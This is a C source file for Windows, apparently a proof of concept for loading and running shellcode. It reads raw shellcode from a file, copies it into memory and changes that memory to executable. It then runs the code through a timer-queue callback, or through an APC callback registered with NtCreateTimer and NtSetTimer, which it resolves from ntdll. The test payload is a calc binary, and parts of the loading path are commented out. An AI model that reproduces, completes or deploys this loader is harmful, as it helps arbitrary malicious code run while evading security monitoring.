#define _CRT_SECURE_NO_WARNINGS
#include <stdlib.h>
#include <stdio.h>
#include <windows.h>


//#define NotificationTimer 0x00200000



int prepare(PBYTE sc, size_t sc_size, PVOID* addr) {
	printf("Allocating memory\n");
    *addr = VirtualAlloc(NULL, sc_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (*addr == NULL) {
        printf("Memory allocation failed: %d\n", GetLastError());
        return 1;
    }
	printf("Allocated Memory start address: 0x%p\n", *addr);

	printf("Writing the shellcode\n");
    memcpy(*addr, sc, sc_size);

	//printf("Press ENTER to continue..\n");
	//getchar();

    DWORD old = 0;
	printf("Switching memory protection\n");
    if (!VirtualProtect(*addr, sc_size, PAGE_EXECUTE_READ, &old)) {
        printf("VirtualProtect failed: %d\n", GetLastError());
        return 1;
    }
	//printf("Press ENTER to continue..\n");
	//getchar();
    return 0;
}


int Exec(PVOID addr) {
	printf("Creating timer for execution trough a callback\n");
    HANDLE hTimer = NULL;
	HANDLE tqueue = CreateTimerQueue();
	HANDLE fEvent = CreateEvent(NULL, TRUE, FALSE, NULL);

    if (!CreateTimerQueueTimer(&hTimer, tqueue, (WAITORTIMERCALLBACK)addr, NULL, 100, 0, 0)) {
        printf("CreateTimer failed: %d", GetLastError());
        return 1;
    }
	WaitForSingleObject(fEvent, INFINITE);

    return 0;
}


//Read the shellcode from file
int ReadF(const char* file_path, long* file_size, char** read_buffer) {
	FILE* file;

	file = fopen(file_path, "rb");
	if (file == NULL) {
		printf("Error opening file: %s", file_path);
		*file_size = 0;
		return 1;
	}

	fseek(file, 0, SEEK_END);
	*file_size = ftell(file);
	rewind(file);

	*read_buffer = (char*)malloc(*file_size * sizeof(char));
	if (*read_buffer == NULL) {
		printf("Memory allocation failed");
		fclose(file);
		return 1;
	}

	fread(*read_buffer, 1, *file_size, file);
	fclose(file);
	return 0;
}

//macro
#ifndef InitializeObjectAttributes
#define InitializeObjectAttributes( p, n, a, r, s ) { \
	(p)->Length = sizeof( OBJECT_ATTRIBUTES );        \
	(p)->RootDirectory = r;                           \
	(p)->Attributes = a;                              \
	(p)->ObjectName = n;                              \
	(p)->SecurityDescriptor = s;                      \
	(p)->SecurityQualityOfService = NULL;             \
}
#endif



//syscall based callback

typedef struct _LSA_UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} LSA_UNICODE_STRING, * PLSA_UNICODE_STRING, UNICODE_STRING, * PUNICODE_STRING, * PUNICODE_STR;

typedef struct _OBJECT_ATTRIBUTES {
	ULONG Length;
	PVOID RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG Attributes;
	PVOID SecurityDescriptor;
	PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;


typedef VOID(CALLBACK* PTIMER_APC_ROUTINE)(
	IN PVOID TimerContext,
	IN ULONG TimerLowValue,
	IN LONG TimerHighValue);


typedef struct _IO_STATUS_BLOCK {
	union {
		NTSTATUS Status;
		PVOID    Pointer;
	};
	ULONG_PTR Information;
} IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;


typedef enum _TIMER_TYPE 
{
	NotificationTimer,
	SynchronizationTimer
} TIMER_TYPE, *PTIMER_TYPE;



typedef NTSTATUS(NTAPI* fnNtCreateTimer)(
	OUT PHANDLE             TimerHandle,
	IN ACCESS_MASK          DesiredAccess,
	IN POBJECT_ATTRIBUTES   ObjectAttributes OPTIONAL,
	IN TIMER_TYPE           TimerType
	);

typedef NTSTATUS(NTAPI* fnNtSetTimer)(
	IN HANDLE               TimerHandle,
	IN PLARGE_INTEGER       DueTime,
	IN PTIMER_APC_ROUTINE   TimerApcRoutine OPTIONAL,
	IN PVOID                TimerContext OPTIONAL,
	IN BOOLEAN              ResumeTimer,
	IN LONG                 Period OPTIONAL,
	OUT PBOOLEAN            PreviousState OPTIONAL
	);



typedef NTSTATUS(NTAPI* fnNtWaitForSingleObject)(
	IN HANDLE ObjectHandle,
	IN BOOLEAN Alertable,
	IN PLARGE_INTEGER Timeout
	);


VOID CALLBACK ShellcodeApcRoutine(
	PVOID TimerContext,
	ULONG TimerLowValue,
	LONG TimerHighValue
) {
	/*
	long sc_size;
	char* sc;

	ReadF("C:\\Users\\nullb1t3\\Desktop\\calc.bin", &sc_size, &sc);
	// Cast the shellcode as a function pointer and call it
	printf("Allocating memory\n");
	PVOID addr = VirtualAlloc(NULL, sc_size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	printf("Writing shellcode to: 0x%p\n", addr);
	memcpy(addr, sc, sc_size);
	((VOID(*)())addr)();
	*/
	printf("Callback from the timer!\n");
	
}


LARGE_INTEGER SecondsToRelativeLargeInteger(int seconds) {
	LARGE_INTEGER li;
	li.QuadPart = -(int)seconds * 10000000LL;
	return li;
}


int main()
{
	DWORD pid = getpid();
	printf("Current process PID: %d\n", pid);

	//long sc_size;
	//char* sc;
	//PVOID addr = NULL;

	//ReadF("C:\\Users\\nullb1t3\\Desktop\\calc.bin", &sc_size, &sc);


	HMODULE hModule = LoadLibraryA("ntdll.dll");

	fnNtCreateTimer cTimer = (fnNtCreateTimer)GetProcAddress(hModule, "NtCreateTimer");
	fnNtSetTimer sTimer = (fnNtSetTimer)GetProcAddress(hModule, "NtSetTimer");
	fnNtWaitForSingleObject waiter = (fnNtWaitForSingleObject)GetProcAddress(hModule, "NtWaitForSingleObject");

	HANDLE hTimer;
	OBJECT_ATTRIBUTES objAttributes;
	IO_STATUS_BLOCK ioStatus;
	//LARGE_INTEGER dueTime;


	InitializeObjectAttributes(&objAttributes, NULL, 0, NULL, NULL);


	PTIMER_APC_ROUTINE runner = ShellcodeApcRoutine;



	printf("Creating timer\n");
	NTSTATUS status = cTimer(&hTimer, TIMER_ALL_ACCESS, &objAttributes, NotificationTimer);
	if (status == 0x00) {
		
		printf("Handle: 0x%X\n", hTimer);

		printf("Updating the timer\n");
		LARGE_INTEGER dueTime = SecondsToRelativeLargeInteger(2);

		status = sTimer(hTimer, &dueTime, (PTIMER_APC_ROUTINE)runner, NULL, FALSE, 0, NULL);
		printf("SetTimer status: 0x%p\n", status);

		printf("Waiting..\n");
		status = waiter(hTimer, FALSE, NULL);
		printf("wait status: 0x%p\n", status);

	}
	else {
		printf("Timer create failed: 0x%p\n", status);
	}


	/*
	prepare(sc, sc_size, &addr);
	printf("Memory start address: 0x%p\n", addr);

	Exec(addr);
	*/



    return 0;
}

